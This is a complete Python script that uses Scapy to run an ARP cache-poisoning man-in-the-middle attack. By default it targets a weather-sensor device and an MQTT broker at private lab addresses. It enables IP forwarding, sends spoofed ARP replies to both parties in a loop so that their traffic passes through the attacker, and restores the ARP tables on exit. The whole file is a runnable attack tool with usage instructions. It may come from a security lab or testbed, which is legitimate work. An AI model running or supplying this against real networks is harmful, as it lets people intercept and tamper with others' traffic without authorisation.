#!/usr/bin/env python3
"""
MITM — ARP cache poisoning (Scapy). Convinces a victim device and the MQTT
broker that the attacker is the other party, so their traffic flows through
the attacker (who forwards it, staying transparent).

Usage: python mitm.py [victim_ip] [broker_ip]
Default: victim=192.168.1.10 (weather sensor)  broker=192.168.1.193
Ctrl+C OR SIGTERM (from `timeout`) both restore the ARP tables.
"""
import sys, os, time, signal
from scapy.all import ARP, Ether, srp, send, conf

victim = sys.argv[1] if len(sys.argv) > 1 else "192.168.1.10"
broker = sys.argv[2] if len(sys.argv) > 2 else "192.168.1.193"


def mac(ip):
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip),
                 timeout=2, verbose=0)
    for _, r in ans:
        return r.hwsrc
    return None


def poison(target_ip, target_mac, impersonate_ip):
    send(ARP(op=2, pdst=target_ip, hwdst=target_mac,
             psrc=impersonate_ip), verbose=0)


def restore(t1_ip, t1_mac, t2_ip, t2_mac):
    send(ARP(op=2, pdst=t1_ip, hwdst=t1_mac,
             psrc=t2_ip, hwsrc=t2_mac), count=5, verbose=0)
    send(ARP(op=2, pdst=t2_ip, hwdst=t2_mac,
             psrc=t1_ip, hwsrc=t1_mac), count=5, verbose=0)


_state = {"running": True, "victim_mac": None, "broker_mac": None}


def _shutdown(signum, frame):
    print(f"\n[mitm] signal {signum} received — restoring ARP tables ...",
          flush=True)
    _state["running"] = False


signal.signal(signal.SIGTERM, _shutdown)
signal.signal(signal.SIGINT,  _shutdown)


if __name__ == "__main__":
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    vmac = mac(victim)
    bmac = mac(broker)
    _state["victim_mac"] = vmac
    _state["broker_mac"] = bmac
    if not vmac or not bmac:
        print(f"[mitm] could not resolve MACs "
              f"(victim={vmac}, broker={bmac})", flush=True)
        sys.exit(1)
    print(f"[mitm] poisoning {victim} ({vmac})  <->  "
          f"{broker} ({bmac})", flush=True)
    print("[mitm] forwarding enabled; intercepting traffic. "
          "Ctrl+C / SIGTERM to stop.", flush=True)
    n = 0
    try:
        while _state["running"]:
            poison(victim, vmac, broker)
            poison(broker, bmac, victim)
            n += 2
            if n % 20 == 0:
                print(f"  sent {n} spoofed ARP replies", flush=True)
            time.sleep(2)
    except Exception as e:
        print(f"[mitm] error: {e}", flush=True)
    finally:
        if vmac and bmac:
            restore(victim, vmac, broker, bmac)
            print(f"[mitm] ARP tables restored. {n} spoofed replies sent.",
                  flush=True)
